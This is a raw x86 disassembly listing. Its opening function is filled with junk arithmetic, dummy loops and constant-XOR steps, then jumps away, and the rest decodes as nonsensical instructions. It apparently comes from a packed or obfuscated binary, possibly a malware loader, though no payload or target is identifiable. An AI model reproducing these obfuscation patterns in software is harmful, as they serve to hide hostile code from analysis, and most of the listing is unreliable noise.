  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42a9d7
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42a9db
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	lea    ebx,ds:0x205d1738
  419511:	add    BYTE PTR [ebx-0x7c7c9fb3],0x4e
  419518:	inc    esi
  419519:	push   edi
  41951a:	shl    BYTE PTR [ecx],cl
  41951c:	cli    
  41951d:	xor    al,0x65
  41951f:	mov    ds:0x464e582a,al
  419524:	data16 sahf 
  419526:	dec    ecx
  419527:	pop    ss
  419528:	mov    esp,0xff0865c3
  41952d:	rol    eax,cl
  41952f:	das    
  419530:	xchg   ecx,eax
  419531:	sbb    al,0xb
  419533:	sahf   
  419534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419535:	inc    edx
  419536:	and    eax,0x79176c13
  41953b:	stos   BYTE PTR es:[edi],al
  41953c:	mov    ?,ecx
  41953e:	lods   eax,DWORD PTR ds:[esi]
  41953f:	push   ecx
  419540:	pop    DWORD PTR [ecx]
  419542:	mov    bl,0xcf
  419544:	jbe    0x419555
  419546:	adc    edi,ebx
  419548:	mov    eax,edi
  41954a:	sbb    bh,BYTE PTR [ebx+0x596469d4]
  419550:	cmp    al,0xcb
  419552:	pop    DWORD PTR [esi]
  419554:	lods   al,BYTE PTR ds:[esi]
  419555:	shr    esi,1
  419557:	popf   
  419558:	dec    edi
  419559:	mov    al,0x13
  41955b:	call   0xecf3:0x3683ad50
  419562:	ds (bad) 
  419564:	sti    
  419565:	or     DWORD PTR [ebp+ebx*2+0x20d5c6a0],edx
  41956c:	mov    BYTE PTR [eax-0xf85bf5d],dl
  419572:	ret    0xbf56
  419575:	add    ecx,DWORD PTR [ebx]
  419577:	add    eax,0xd5723611
  41957c:	call   0x1be4824b
  419581:	les    esp,FWORD PTR [eax]
  419583:	xchg   ebx,eax
  419584:	inc    esi
  419585:	ror    DWORD PTR [ecx+0x31bb08e7],cl
  41958b:	not    BYTE PTR [esp+edx*2]
  41958e:	jae    0x419597
  419590:	add    al,0x6d
  419592:	jae    0x41952a
  419594:	js     0x41959f
  419596:	ret    0xbe06
  419599:	ret    
  41959a:	mov    al,0xb0
  41959c:	mov    esp,0xb9a0994a
  4195a1:	jns    0x419577
  4195a3:	ins    BYTE PTR es:[edi],dx
  4195a4:	or     cl,BYTE PTR [ebx-0x77]
  4195a7:	dec    ebp
  4195a8:	inc    eax
  4195a9:	push   eax
  4195aa:	pop    ss
  4195ab:	jg     0x41952d
  4195ad:	push   edi
  4195ae:	dec    eax
  4195af:	mov    esp,0x34cbb3b1
  4195b4:	push   ecx
  4195b5:	mov    bl,dl
  4195b7:	and    eax,0x6d91546e
  4195bc:	xlat   BYTE PTR ds:[ebx]
  4195bd:	out    dx,al
  4195be:	jae    0x41955d
  4195c0:	mov    dh,0x6
  4195c2:	(bad)  
  4195c3:	and    ecx,DWORD PTR [esp+edi*1-0x361f4e07]
  4195ca:	add    BYTE PTR [edi+ebx*8-0x63],bh
  4195ce:	adc    DWORD PTR [ecx],0x9f5d07c9
  4195d4:	sub    eax,0xe8b324b3
  4195d9:	mov    es,esp
  4195db:	and    DWORD PTR gs:[edx],esi
  4195de:	inc    ebx
  4195df:	int    0xf6
  4195e1:	xchg   ebp,eax
  4195e2:	cmp    eax,0x75dae728
  4195e7:	scas   eax,DWORD PTR es:[edi]
  4195e8:	jns    0x4195b0
  4195ea:	pop    ss
  4195eb:	mov    cl,0x9c
  4195ed:	xchg   esi,eax
  4195ee:	fild   WORD PTR [ebp+ebx*8+0x71ec55d2]
  4195f5:	rcr    BYTE PTR [ecx+0x16128f6c],cl
  4195fb:	xchg   DWORD PTR [eax-0x6bd7f67e],edx
  419601:	dec    ebx
  419602:	xchg   BYTE PTR [edx+0x6a],ah
  419605:	stos   DWORD PTR es:[edi],eax
  419606:	inc    edx
  419607:	push   es
  419608:	or     DWORD PTR [edi-0x679d421d],eax
  41960e:	in     al,0x57
  419610:	mov    ebx,0xe9ae5953
  419615:	repz sub ch,BYTE PTR [bx+si-0x2d6e]
  41961b:	mov    ds:0x1e2b96c4,eax
  419620:	push   es
  419621:	jl     0x4195f7
  419623:	fadd   QWORD PTR [edx-0xc8bf774]
  419629:	inc    edi
  41962a:	sti    
  41962b:	fadd   DWORD PTR [ebp+0x6b4accba]
  419631:	xchg   edx,eax
  419632:	push   edi
  419633:	repnz dec esp
  419635:	int3   
  419636:	pop    ss
  419637:	or     al,0xe5
  419639:	fld    TBYTE PTR ss:[esi]
  41963c:	jae    0x4195e1
  41963e:	dec    ecx
  41963f:	cmc    
  419640:	int3   
  419641:	xor    cl,ah
  419643:	dec    ebp
  419644:	jns    0x4195d2
  419646:	mov    edi,0x4273ce98
  41964b:	mov    edx,esp
  41964d:	and    bh,BYTE PTR [edx]
  41964f:	mov    eax,0x9d4359f4
  419654:	adc    esp,DWORD PTR [edi+0x18]
  419657:	pop    ebp
  419658:	cdq    
  419659:	pop    ebp
  41965a:	xor    dh,bl
  41965c:	int3   
  41965d:	ret    0x3743
  419660:	stc    
  419661:	(bad)  
  419662:	(bad)  
  419663:	fchs   
  419665:	jb     0x419685
  419667:	cmp    al,0x1b
  419669:	(bad)  
  41966a:	pop    edi
  41966b:	pop    ecx
  41966c:	mov    al,bl
  41966e:	das    
  41966f:	sbb    ebx,DWORD PTR [edi]
  419671:	xchg   ebp,eax
  419672:	mov    edx,0x3c92c2d7
  419677:	push   es
  419678:	fwait
  419679:	dec    BYTE PTR [edx+ecx*4+0xb]
  41967d:	mov    esi,0xbb424e9d
  419682:	daa    
  419683:	xchg   edi,eax
  419684:	leave  
  419685:	push   0xffffff81
  419687:	sahf   
  419688:	fcom   DWORD PTR [ecx-0x30]
  41968b:	loope  0x41966e
  41968d:	lahf   
  41968e:	aas    
  41968f:	push   DWORD PTR [ebp-0x1833c748]
  419695:	cmp    al,0x67
  419697:	or     DWORD PTR [eax],edi
  419699:	sbb    BYTE PTR [edi-0x56],ch
  41969c:	outs   dx,BYTE PTR ds:[esi]
  41969d:	mov    esp,0x81dc6581
  4196a2:	cmc    
  4196a3:	fist   WORD PTR [eax-0x29]
  4196a6:	fisub  WORD PTR [eax-0x2f325e0c]
  4196ac:	test   eax,0xad32be41
  4196b2:	sbb    DWORD PTR ds:0x8a36f9a5,esp
  4196b8:	dec    eax
  4196b9:	shr    DWORD PTR [ebp-0x54ad9106],cl
  4196bf:	in     al,dx
  4196c0:	lock arpl WORD PTR [edx+edx*8-0x1a],ax
  4196c5:	xchg   esp,eax
  4196c6:	jle    0x419668
  4196c8:	mov    eax,0x4c78d9f6
  4196cd:	xor    BYTE PTR [edx+0x75],cl
  4196d0:	test   BYTE PTR [esi+edx*1],ah
  4196d3:	mov    edi,0x338f123f
  4196d8:	cmp    eax,0x8174f0ae
  4196dd:	or     al,0xb0
  4196df:	stos   BYTE PTR es:[edi],al
  4196e0:	jmp    0x419758
  4196e2:	inc    edi
  4196e3:	mov    eax,0xf40604b7
  4196e8:	dec    ebp
  4196e9:	sub    eax,0xea6be428
  4196ee:	in     eax,0x70
  4196f0:	push   eax
  4196f1:	ret    0xd822
  4196f4:	outs   dx,BYTE PTR ds:[esi]
  4196f5:	push   ds
  4196f6:	jbe    0x419719
  4196f8:	dec    edi
  4196f9:	sub    edx,edi
  4196fb:	or     al,0x4e
  4196fd:	xor    eax,0x463f7eb7
  419702:	cmp    eax,0xbb3d2b87
  419707:	pop    es
  419708:	bound  eax,QWORD PTR [eax-0xe5f989a]
  41970e:	add    DWORD PTR [esi-0x7e],0x2d
  419712:	test   eax,0xc36c1ac5
  419717:	mov    al,al
  419719:	mov    ds:0x164e992,eax
  41971e:	jb     0x4196f9
  419720:	inc    edx
  419721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419722:	(bad)  
  419723:	lds    esi,FWORD PTR [ebx+0x15081dce]
  419729:	sbb    dl,bh
  41972b:	imul   ebp,DWORD PTR [edi+0x4b],0xffffffdb
  41972f:	sbb    DWORD PTR [esp+ebx*8],edi
  419732:	retf   
  419733:	das    
  419734:	rcr    ecx,1
  419736:	push   ebp
  419737:	hlt    
  419738:	inc    edx
  419739:	xchg   edi,eax
  41973a:	pop    esi
  41973b:	mov    cl,bl
  41973d:	das    
  41973e:	xchg   DWORD PTR [ebp+0x4d1ab715],ebx
  419744:	hlt    
  419745:	and    ah,BYTE PTR [edx-0x55]
  419748:	push   ebp
  419749:	bound  esi,QWORD PTR [eax+ebx*1]
  41974c:	sbb    al,0x1e
  41974e:	call   0xf39f84a2
  419753:	daa    
  419754:	jno    0x419745
  419756:	fwait
  419757:	jne    0x419731
  419759:	hlt    
  41975a:	lock arpl WORD PTR ds:0xd90d6c28,ax
  419761:	jb     0x419769
  419763:	arpl   WORD PTR [ebp+0x1f],si
  419766:	shl    dl,1
  419768:	inc    esi
  419769:	fcmovne st,st(3)
  41976b:	pop    edi
  41976c:	jg     0x41971a
  41976e:	xor    al,0x55
  419770:	jne    0x41972c
  419772:	out    0xab,eax
  419774:	cmp    al,0xe5
  419776:	inc    esp
  419777:	sub    BYTE PTR [edx+0x19],ch
  41977a:	imul   edx,DWORD PTR [edx+0x533cbed5],0x8588bb85
  419784:	add    BYTE PTR [ebx+0x67],bh
  419787:	out    dx,eax
  419788:	mov    bh,0x9
  41978a:	fs adc al,0x1d
  41978d:	call   0x9e70:0x8ae39f13
  419794:	iret   
  419795:	sti    
  419796:	push   0x2
  419798:	or     DWORD PTR [edi-0x65],esi
  41979b:	push   esi
  41979c:	push   ebx
  41979d:	sub    eax,0xefa7633f
  4197a2:	xchg   esp,eax
  4197a3:	pushf  
  4197a4:	mov    es,WORD PTR [edx-0x63a84e1d]
  4197aa:	xchg   edi,eax
  4197ab:	jnp    0x4197d2
  4197ad:	cmc    
  4197ae:	xchg   ebp,eax
  4197af:	je     0x41976b
  4197b1:	out    0x43,al
  4197b3:	lods   al,BYTE PTR ss:[esi]
  4197b5:	rcl    ch,0xfb
  4197b8:	jmp    0xc69aa66c
  4197bd:	popf   
  4197be:	xor    eax,0x71b04494
  4197c3:	xor    eax,0xd1f3fb23
  4197c8:	mov    DWORD PTR [edx-0x6c],edi
  4197cb:	arpl   WORD PTR [edi+0x7c8591ab],dx
  4197d1:	mov    ds:0x70580611,al
  4197d6:	inc    ebx
  4197d7:	mov    edx,0x4508949a
  4197dc:	ja     0x41984d
  4197de:	ss popf 
  4197e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197e1:	popf   
  4197e2:	push   es
  4197e3:	retf   0xf366
  4197e6:	ds call 0x80de:0xaf9ab3c7
  4197ee:	sub    al,0xf1
  4197f0:	dec    ebp
  4197f1:	or     ah,BYTE PTR [ebp+0x3739f472]
  4197f7:	(bad)  
  4197f8:	mov    edi,0x2cc69063
  4197fd:	sbb    al,0x2a
  4197ff:	sbb    eax,0xb9643ff0
  419804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419805:	pop    eax
  419806:	imul   esi,DWORD PTR [eax+0x77],0xc04808a6
  41980d:	mov    esi,0x3cabfab
  419812:	mov    BYTE PTR [ebx+eiz*8+0x23],0x87
  419817:	outs   dx,BYTE PTR ds:[esi]
  419818:	push   cs
  419819:	jbe    0x41979f
  41981b:	loope  0x4197c1
  41981d:	push   0x5c
  41981f:	enter  0x4a9b,0x39
  419823:	pop    es
  419824:	cmp    al,0xcd
  419826:	and    DWORD PTR [edi+0x329215c6],0xffffffab
  41982d:	in     eax,dx
  41982e:	push   eax
  41982f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419831:	stos   DWORD PTR es:[edi],eax
  419832:	mov    al,ds:0x4a62c7f1
  419837:	xchg   DWORD PTR [edx-0x223d55b4],ebx
  41983d:	sbb    eax,0x8a33619f
  419842:	xor    eax,0xe8041619
  419847:	push   eax
  419848:	cli    
  419849:	adc    dh,BYTE PTR [edx-0x50]
  41984c:	jnp    0x419822
  41984e:	dec    ecx
  41984f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419850:	sub    ah,BYTE PTR [edx]
  419852:	jle    0x419839
  419854:	mov    dh,0x3f
  419856:	fsub   QWORD PTR [edi+0x25]
  419859:	push   ebx
  41985a:	fldcw  WORD PTR [edx]
  41985c:	jne    0x41984e
  41985e:	sar    BYTE PTR [edi+0x5ca3c74d],1
  419864:	jl     0x41981f
  419866:	jb     0x419871
  419868:	mov    esp,0x8ce5ed1e
  41986d:	pop    edx
  41986e:	add    DWORD PTR [ebx+edi*4+0x7d01e9b],eax
  419875:	stos   DWORD PTR es:[edi],eax
  419876:	pop    eax
  419877:	inc    ebp
  419878:	or     dh,dh
  41987a:	cli    
  41987b:	outs   dx,BYTE PTR ds:[esi]
  41987c:	sbb    al,0xc3
  41987e:	add    bl,BYTE PTR [edx-0x1f]
  419881:	daa    
  419882:	test   BYTE PTR ds:0xb50ea14a,ch
  419888:	dec    eax
  419889:	iret   
  41988a:	test   esp,edx
  41988c:	data16 xor BYTE PTR [eax-0x14],bh
  419890:	jo     0x419853
  419892:	aaa    
  419893:	fsub   st,st(2)
  419895:	retf   0xf4f0
  419898:	push   ebp
  419899:	call   0xdb11ee6a
  41989e:	addr16 call 0xe86339da
  4198a4:	fadd   st,st(1)
  4198a6:	fwait
  4198a7:	cli    
  4198a8:	push   edi
  4198a9:	sub    ecx,DWORD PTR [esi+ebx*4]
  4198ac:	fisttp DWORD PTR [edi-0x5f]
  4198af:	or     eax,0x49618fbc
  4198b4:	in     eax,0xe9
  4198b6:	sbb    dl,BYTE PTR [edi-0x71be33eb]
  4198bc:	xlat   BYTE PTR ds:[ebx]
  4198bd:	fs pop es
  4198bf:	mov    eax,ds:0xb7b675cb
  4198c4:	push   edx
  4198c5:	test   DWORD PTR [edi-0xd],esp
  4198c8:	and    al,0xcf
  4198ca:	adc    al,0xe7
  4198cc:	retf   0x8bb3
  4198cf:	adc    ch,BYTE PTR [esi-0x48]
  4198d2:	sar    BYTE PTR [ecx+esi*4+0x45235718],cl
  4198d9:	jnp    0x41990b
  4198db:	jp     0x419910
  4198dd:	adc    BYTE PTR [edi+0x58],ch
  4198e0:	idiv   BYTE PTR [esi+esi*2-0x5dc21fc1]
  4198e7:	adc    eax,0xab5ba9de
  4198ec:	jle    0x41991f
  4198ee:	retf   0x33fe
  4198f1:	dec    ebx
  4198f2:	jnp    0x419923
  4198f4:	outs   dx,BYTE PTR ds:[esi]
  4198f5:	push   0xffffffda
  4198f7:	bound  edx,QWORD PTR [ebx+0x4dd6717b]
  4198fd:	call   0xed10:0x40089818
  419904:	sbb    dh,ah
  419906:	mov    eax,0x94ce4e92
  41990b:	mov    eax,0x340ca08b
  419910:	(bad)  
  419911:	in     eax,dx
  419912:	push   ecx
  419913:	jmp    0x4198b1
  419915:	push   ds
  419916:	pop    ebp
  419917:	mov    ecx,0x3f4a23c4
  41991c:	aas    
  41991d:	or     ecx,ebp
  41991f:	push   ebx
  419920:	sbb    ch,BYTE PTR [edi]
  419922:	xor    dl,BYTE PTR [edi+0x73025d71]
  419928:	mov    bh,0xcb
  41992a:	inc    ecx
  41992b:	dec    edx
  41992c:	and    BYTE PTR [edi],ch
  41992e:	xchg   ebx,eax
  41992f:	dec    edx
  419930:	xchg   ebp,eax
  419931:	cdq    
  419932:	mov    edx,0xcbc9ae5b
  419937:	inc    esi
  419938:	jecxz  0x4198d0
  41993a:	mov    ch,0x10
  41993c:	shl    BYTE PTR [eax-0x63],cl
  41993f:	gs jbe 0x419922
  419942:	nop
  419943:	jno    0x4198f0
  419945:	mov    cl,0xbb
  419947:	(bad)  
  419948:	ficom  WORD PTR ds:[edi+0x4a]
  41994c:	inc    ebx
  41994e:	sbb    dl,BYTE PTR [edi]
  419950:	cmp    eax,0xf13d7bc0
  419955:	and    cl,BYTE PTR [ecx]
  419957:	xchg   edx,eax
  419958:	ret    
  419959:	jmp    0x73fc:0x6725f623
  419960:	xchg   esi,eax
  419961:	fucomp st(4)
  419963:	das    
  419964:	xchg   esi,eax
  419965:	fimul  WORD PTR [eax-0x2718ef89]
  41996b:	add    al,0x37
  41996d:	lea    ecx,[edx-0x63]
  419970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419971:	xor    BYTE PTR [edx*8-0x4259e68d],ah
  419978:	shl    DWORD PTR [esi+edx*2+0x1d73aaee],cl
  41997f:	out    dx,eax
  419980:	push   ss
  419981:	xchg   esp,eax
  419982:	push   ds
  419983:	scas   al,BYTE PTR es:[edi]
  419984:	xor    dh,dh
  419986:	pop    ebp
  419987:	jmp    0x4199fc
  419989:	or     DWORD PTR [eax+0x49],edx
  41998c:	cwde   
  41998d:	test   eax,0xa1f969db
  419992:	mov    ah,0xf4
  419994:	pop    ebp
  419995:	imul   edi,DWORD PTR [edi-0x2f],0x6b
  419999:	jns    0x4199ce
  41999b:	mov    esp,0x110bd5dc
  4199a0:	dec    esi
  4199a1:	xor    al,0xfa
  4199a3:	adc    BYTE PTR [ebx-0x3d],ah
  4199a6:	xchg   edx,eax
  4199a7:	ror    DWORD PTR [ebx-0x433f8f33],cl
  4199ad:	sub    eax,0x6d676691
  4199b2:	idiv   BYTE PTR [eax-0x47]
  4199b5:	aas    
  4199b6:	imul   ecx,DWORD PTR [edx+0x2c],0x71
  4199ba:	in     al,0x97
  4199bc:	xor    ebx,ebp
  4199be:	pushf  
  4199bf:	aam    0x9
  4199c1:	inc    esp
  4199c2:	jp     0x4199ec
  4199c4:	mov    ebx,0xd5e1ad1b
  4199c9:	test   eax,0x80f5baf0
  4199ce:	jae    0x4199af
  4199d0:	jecxz  0x419985
  4199d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199d3:	inc    esi
  4199d4:	fsubr  DWORD PTR [edx-0x10e764a8]
  4199da:	dec    ebx
  4199db:	mov    ebx,0x347833d3
  4199e0:	cmc    
  4199e1:	pop    edx
  4199e2:	cmp    ebp,DWORD PTR [eax]
  4199e4:	arpl   si,cx
  4199e6:	and    eax,0x264a8e5c
  4199eb:	aam    0xd0
  4199ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199ee:	mov    ch,BYTE PTR [ebx-0x26]
  4199f1:	das    
  4199f2:	pushf  
  4199f3:	test   BYTE PTR [ecx-0x3b],dl
  4199f6:	dec    edi
  4199f7:	ret    0x195b
  4199fa:	and    eax,0x282c1c60
  4199ff:	aad    0x2b
  419a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a02:	test   eax,0xe600bf80
  419a07:	aad    0x4
  419a09:	jecxz  0x419a0b
  419a0b:	jb     0x419a63
  419a0d:	test   ebx,ebx
  419a0f:	push   esp
  419a10:	or     al,0x3e
  419a12:	imul   eax,ebp,0x12
  419a15:	int3   
  419a16:	inc    ecx
  419a17:	mov    esi,DWORD PTR [edx+0x24]
  419a1a:	lahf   
  419a1b:	mov    ebx,DWORD PTR [edx-0x57]
  419a1e:	mov    ebp,0xe3a6211d
  419a23:	pushf  
  419a24:	jno    0x419aa1
  419a26:	xor    al,0xe7
  419a28:	adc    al,0x98
  419a2a:	lods   al,BYTE PTR ds:[esi]
  419a2b:	mov    ah,0x9
  419a2d:	pop    edx
  419a2e:	xchg   esi,eax
  419a2f:	mov    al,ds:0x5bf5ba6b
  419a34:	cld    
  419a35:	cmp    DWORD PTR [edx-0x6ec47b8],0xe1f97c8e
  419a3f:	aas    
  419a40:	and    BYTE PTR [eax],al
  419a42:	dec    ebp
  419a43:	dec    edi
  419a44:	dec    edx
  419a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a46:	jo     0x419a70
  419a48:	xchg   DWORD PTR [eax-0x68],ebx
  419a4b:	outs   dx,BYTE PTR ds:[esi]
  419a4c:	idiv   BYTE PTR [esp+ebp*8]
  419a4f:	mov    DWORD PTR [edx-0x25],edi
  419a52:	pop    edi
  419a53:	cli    
  419a54:	adc    BYTE PTR ds:0xcdddc298,dl
  419a5a:	out    dx,al
  419a5b:	int3   
  419a5c:	and    dl,BYTE PTR [esp+eax*4]
  419a5f:	inc    ebp
  419a60:	es push ecx
  419a62:	repnz adc eax,0x38cbfafc
  419a68:	mov    eax,ds:0x802c17c9
  419a6d:	inc    eax
  419a6e:	and    eax,DWORD PTR [eax+0x52]
  419a71:	or     edi,ebp
  419a73:	mov    eax,ds:0x9ec84a75
  419a78:	ss jo  0x419a40
  419a7b:	push   es
  419a7c:	sbb    ecx,0x2ff8eea9
  419a82:	(bad)  [ebp*2-0x43a0e2de]
  419a89:	dec    esp
  419a8a:	aam    0x33
  419a8c:	push   eax
  419a8d:	les    esi,FWORD PTR [ecx+ecx*2+0x53]
  419a91:	push   0xffffff86
  419a93:	sub    ah,bl
  419a95:	scas   eax,DWORD PTR es:[edi]
  419a96:	cld    
  419a97:	sub    BYTE PTR [esi-0x40],ch
  419a9a:	mov    ecx,0xb342e292
  419a9f:	lods   eax,DWORD PTR ds:[esi]
  419aa0:	out    dx,eax
  419aa1:	cmp    al,0x8
  419aa3:	add    eax,0x7985414b
  419aa8:	loope  0x419a79
  419aaa:	in     al,dx
  419aab:	mov    dl,0x6
  419aad:	lods   eax,DWORD PTR ds:[esi]
  419aae:	jne    0x419ab2
  419ab0:	scas   eax,DWORD PTR es:[edi]
  419ab1:	xor    DWORD PTR [edx-0x33],ebp
  419ab4:	sti    
  419ab5:	pop    ds
  419ab6:	xor    esp,DWORD PTR [ebp-0x49]
  419ab9:	push   edx
  419aba:	adc    ecx,edi
  419abc:	mov    ds:0x5cf12c8,eax
  419ac1:	out    dx,eax
  419ac2:	fimul  DWORD PTR [esp+edi*4-0x1f]
  419ac6:	ret    
  419ac7:	lea    edi,[eax]
  419ac9:	ficomp DWORD PTR [edx-0x4aefb519]
  419acf:	jmp    0xd5322072
  419ad4:	jae    0x419b3b
  419ad6:	ret    0xa725
  419ad9:	sub    ebp,DWORD PTR [ecx]
  419adb:	inc    ecx
  419adc:	push   ebp
  419add:	retf   0xdff6
  419ae0:	mov    al,0x81
  419ae2:	mov    edx,0x5327b0b7
  419ae7:	and    edx,DWORD PTR [ebx]
  419ae9:	and    BYTE PTR [ecx+0x52],bh
  419aec:	je     0x419abb
  419aee:	sbb    ah,bl
  419af0:	xchg   ebp,eax
  419af1:	std    
  419af2:	dec    esp
  419af3:	nop
  419af4:	in     al,0x6
  419af6:	lahf   
  419af7:	in     eax,0xdf
  419af9:	popf   
  419afa:	in     al,dx
  419afb:	cmp    bl,BYTE PTR [eax]
  419afd:	fs icebp 
  419aff:	test   dl,cl
  419b01:	aam    0xa9
  419b03:	xor    BYTE PTR [ebx+0x1b],0x55
  419b07:	popa   
  419b08:	retf   0xa2ee
  419b0b:	retf   0xd63a
  419b0e:	dec    esi
  419b0f:	inc    edi
  419b10:	mov    ah,BYTE PTR [edx+0x27d886a7]
  419b16:	test   al,0xc4
  419b18:	adc    esi,DWORD PTR [ebp-0x4]
  419b1b:	inc    ebx
  419b1c:	fcmovu st,st(7)
  419b1e:	imul   esi,DWORD PTR [esi],0x937e78a2
  419b24:	sub    esi,esi
  419b26:	mov    BYTE PTR [esi+0x5d],ch
  419b29:	mov    edi,0xa1104fb8
  419b2e:	ins    BYTE PTR es:[edi],dx
  419b2f:	stos   BYTE PTR es:[edi],al
  419b30:	jb     0x419b56
  419b32:	jle    0x419bab
  419b34:	xchg   esp,eax
  419b35:	retf   0xf971
  419b38:	xchg   ecx,eax
  419b39:	and    BYTE PTR [edi],bh
  419b3b:	or     DWORD PTR [edi-0x28a0523d],edx
  419b41:	xchg   ebx,eax
  419b42:	inc    eax
  419b43:	dec    ebx
  419b44:	xor    esp,DWORD PTR [ebx-0x4f4ae0de]
  419b4a:	(bad)  
  419b4c:	js     0x419b2f
  419b4e:	scas   eax,DWORD PTR es:[edi]
  419b4f:	lock sub dl,BYTE PTR [eax]
  419b52:	cmc    
  419b53:	mov    ah,0xfc
  419b55:	mov    ah,0x9e
  419b57:	std    
  419b58:	fld    QWORD PTR [edi-0x3db13c21]
  419b5e:	jb     0x419b4b
  419b60:	push   cs
  419b61:	push   ecx
  419b62:	push   edi
  419b63:	push   edx
  419b64:	adc    al,0x65
  419b66:	sub    BYTE PTR [ecx-0x31920b64],al
  419b6c:	jge    0x419bb9
  419b6e:	sub    BYTE PTR ss:[ecx+0x67],ah
  419b72:	mov    ebp,0xfa4ba58a
  419b77:	xchg   ebp,eax
  419b78:	iret   
  419b79:	fs cmp al,dh
  419b7c:	(bad)  
  419b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b7e:	scas   eax,DWORD PTR es:[edi]
  419b7f:	call   0x181fd060
  419b84:	xchg   ebp,eax
  419b85:	push   0xd8533773
  419b8a:	xor    ebp,DWORD PTR [ebx+edi*8+0x2167158d]
  419b91:	inc    ecx
  419b92:	xchg   ebx,eax
  419b93:	scas   eax,DWORD PTR es:[edi]
  419b94:	add    al,0xdb
  419b96:	hlt    
  419b97:	fwait
  419b98:	mov    edi,0x5a6d6ac0
  419b9d:	sbb    eax,0xccff1ecb
